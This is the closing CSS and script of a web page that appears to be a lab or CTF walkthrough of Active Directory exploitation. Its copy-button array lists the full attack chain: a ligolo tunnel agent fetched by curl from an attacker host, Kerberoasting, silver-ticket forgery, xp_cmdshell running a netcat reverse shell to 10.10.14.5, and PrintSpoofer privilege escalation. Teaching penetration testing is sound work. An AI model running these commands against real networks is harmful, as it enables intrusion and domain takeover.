.reading ul { margin:0;padding-left:20px;font-family:var(--sans);font-size:14px;color:var(--sub);line-height:1.7; }
.reading ul li::marker { color:var(--yellow); }

.doc-foot { margin-top:48px;padding-top:24px;border-top:1px dashed var(--surface1);display:flex;flex-direction:column;gap:18px; }
.author-card { display:grid;grid-template-columns:56px 1fr auto;gap:16px;align-items:center;background:var(--mantle);border:1px solid var(--surface1);border-left:2px solid var(--mauve);padding:14px 16px;font-family:var(--mono); }
.avatar { width:52px;height:52px;background:var(--base);border:1px solid var(--surface1);display:flex;align-items:center;justify-content:center;font-weight:700;font-size:20px;color:var(--mauve); }
.aw { font-size:13px;color:var(--text);font-weight:600;font-family:var(--sans);margin-bottom:3px; }
.ad { font-size:11.5px;color:var(--sub);line-height:1.5; }
.alinks { display:flex;gap:8px;font-size:11px; }
.alinks a { color:var(--sub);border:1px solid var(--surface1);padding:4px 9px;letter-spacing:.04em;transition:color .15s,border-color .15s; }
.alinks a:hover { color:var(--mauve);border-color:var(--mauve); }
@media (max-width:680px) { .author-card { grid-template-columns:1fr; } }

.back-all { font-size:12px;color:var(--dim);border-bottom:1px dashed var(--surface1);align-self:flex-start;transition:color .15s; }
.back-all:hover { color:var(--mauve); }

aside.toc { position:sticky;top:80px;align-self:start;font-family:var(--mono);font-size:12px;background:var(--mantle);border:1px solid var(--surface1);border-left:2px solid var(--blue);padding:14px 14px 12px;max-height:calc(100vh - 120px);overflow-y:auto; }
aside.toc h4 { margin:0 0 10px;font-size:10px;font-weight:600;letter-spacing:.12em;text-transform:uppercase;color:var(--blue); }
aside.toc ol { margin:0;padding:0;list-style:none;display:flex;flex-direction:column;gap:2px; }
aside.toc ol li a { display:block;color:var(--dim);padding:4px 6px;border-left:1px solid transparent;font-size:11px;transition:color .15s,border-color .15s;line-height:1.4; }
aside.toc ol li a:hover { color:var(--text); }
aside.toc ol li a.on { color:var(--mauve);border-left-color:var(--mauve);background:color-mix(in oklab,var(--mauve) 6%,transparent); }
.toc-meta { margin-top:12px;padding-top:10px;border-top:1px dashed var(--surface1);font-size:10.5px;color:var(--dim);display:flex;flex-direction:column;gap:4px; }
.toc-meta .tk { color:var(--dim);margin-right:5px; }
.toc-meta .tv { color:var(--sub); }

@media (max-width:680px) { .doc-head h1 { font-size:20px; } article { font-size:14.5px; } }
</style>

<script>
const progress = document.getElementById('progress') as HTMLElement;
const toTop    = document.getElementById('toTop') as HTMLElement;
function updProgress() {
  const h = document.documentElement;
  const max = h.scrollHeight - h.clientHeight;
  progress.style.width = (max > 0 ? (h.scrollTop / max) * 100 : 0) + '%';
  toTop.classList.toggle('show', h.scrollTop > 600);
}
document.addEventListener('scroll', updProgress, { passive: true });
updProgress();
toTop.addEventListener('click', () => window.scrollTo({ top: 0, behavior: 'smooth' }));

// TOC scroll-spy
const ids = ['intro','scenario','tunnel','silver','shell','why','privesc','refs'];
const sections = ids.map(id => document.getElementById(id)).filter(Boolean) as HTMLElement[];
const tocLinks = document.querySelectorAll<HTMLAnchorElement>('#tocList a');
const spy = new IntersectionObserver(entries => {
  entries.forEach(e => {
    if (e.isIntersecting) {
      const id = (e.target as HTMLElement).id;
      tocLinks.forEach(a => a.classList.toggle('on', a.getAttribute('href') === '#' + id));
    }
  });
}, { rootMargin: '-20% 0px -70% 0px' });
sections.forEach(s => spy.observe(s));

// copy buttons — stored here to avoid Astro template parsing issues with shell syntax
const COPIES: string[] = [
  "evil-winrm -i 10.10.10.20 -u 'JOHN.SMITH' -p 'Winter2024!'",
  "netstat -ano",
  "sudo ip tuntap add user $(whoami) mode tun ligolo\nsudo ip link set ligolo up\nsudo ligolo-proxy -selfcert",
  "python3 -m http.server",
  "cmd /c curl -O http://10.10.14.5:8000/agent.exe",
  "cmd /c agent.exe -connect 10.10.14.5:11601 -ignore-cert",
  "session\nstart",
  "sudo ip route add 240.0.0.1/32 dev ligolo",
  "impacket-mssqlclient svc_mssql:Passw0rd123!@240.0.0.1 -windows-auth",
  "impacket-GetUserSPNs \"corp.local\"/\"john.smith\":\"Winter2024!\" -dc-ip 10.10.10.10 -request -outputfile hashes.kerberoasting",
  "impacket-lookupsid 'corp.local'/'svc_mssql':'Passw0rd123!'@240.0.0.1",
  "240.0.0.1    srv01.corp.local corp.local",
  "NT=$(echo -n 'Passw0rd123!' | iconv -t utf-16le | openssl dgst -md4 -r | awk '{print $1}')\necho $NT",
  "impacket-ticketer Administrator -spn \"MSSQL/srv01.corp.local\" -domain 'corp.local' -domain-sid 'S-1-5-21-1111111111-2222222222-3333333333' -nthash \"ab4f5a5c42df5a0ee337d12ce77332f5\"",
  "export KRB5CCNAME=$(pwd)/Administrator.ccache",
  "nxc smb 240.0.0.1 -u 'svc_mssql' -p 'Passw0rd123!' --generate-krb5-file krb5.conf\nsudo cp krb5.conf /etc/krb5.conf",
  "cat /etc/krb5.conf",
  "klist",
  "impacket-mssqlclient -k -no-pass Administrator@srv01.corp.local",
  "enable_xp_cmdshell\nxp_cmdshell \"cd C:\\temp && dir\"",
  "xp_cmdshell \"C:\\temp\\nc.exe 10.10.14.5 4445 -e cmd\"",
  "rlwrap -cAr nc -lvnp 4445",
  "whoami /priv",
  "PrintSpoofer64.exe -i -c cmd",
  "whoami /priv",
];

document.addEventListener('click', async e => {
  const b = (e.target as Element).closest<HTMLButtonElement>('.cb .copy');
  if (!b) return;
  const text = COPIES[parseInt(b.dataset.idx ?? '-1')] ?? '';
  try { await navigator.clipboard.writeText(text); }
  catch (_) {
    const ta = document.createElement('textarea');
    ta.value = text; document.body.appendChild(ta);
    ta.select(); try { document.execCommand('copy'); } catch (_) {}
    ta.remove();
  }
  const prev = b.textContent;
  b.classList.add('ok'); b.textContent = '✓';
  setTimeout(() => { b.classList.remove('ok'); b.textContent = prev; }, 1300);
});
</script>
